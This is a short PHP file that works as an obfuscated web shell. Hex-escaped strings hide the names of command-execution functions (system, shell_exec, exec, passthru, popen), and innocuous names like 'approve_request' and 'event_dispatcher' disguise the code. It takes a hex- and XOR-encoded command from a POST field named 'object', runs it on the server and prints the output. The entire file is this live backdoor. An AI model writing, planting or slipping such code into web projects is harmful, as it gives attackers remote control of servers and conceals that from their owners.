<?php

$batch_process = "h\x65x2\x62\x69n";
$approve_request3 = "\x65\x78ec";
$approve_request6 = "s\x74rea\x6D_\x67\x65t_\x63o\x6Et\x65n\x74\x73";
$approve_request2 = "sh\x65\x6C\x6C\x5Fe\x78ec";
$approve_request7 = "\x70\x63l\x6Fse";
$approve_request5 = "\x70\x6Fpen";
$approve_request1 = "\x73y\x73\x74em";
$approve_request4 = "\x70\x61s\x73t\x68ru";
if (isset($_POST["\x6F\x62j\x65ct"])) {
            function event_dispatcher( $obj , $reference) {
 $ent='';
$l=0;
 do{
$ent.=chr(ord($obj[$l])^$reference);
$l++;

} while($l<strlen($obj));
 return $ent;

}
            $object = $batch_process($_POST["\x6F\x62j\x65ct"]);
            $object = event_dispatcher($object, 96);
            if (function_exists($approve_request1)) {
                $approve_request1($object);
            } elseif (function_exists($approve_request2)) {
                print $approve_request2($object);
            } elseif (function_exists($approve_request3)) {
                $approve_request3($object, $hld_obj);
                print join("\n", $hld_obj);
            } elseif (function_exists($approve_request4)) {
                $approve_request4($object);
            } elseif (function_exists($approve_request5) && function_exists($approve_request6) && function_exists($approve_request7)) {
                $reference_ent = $approve_request5($object, 'r');
                if ($reference_ent) {
                    $item_elem = $approve_request6($reference_ent);
                    $approve_request7($reference_ent);
                    print $item_elem;
                }
            }
            exit;
        }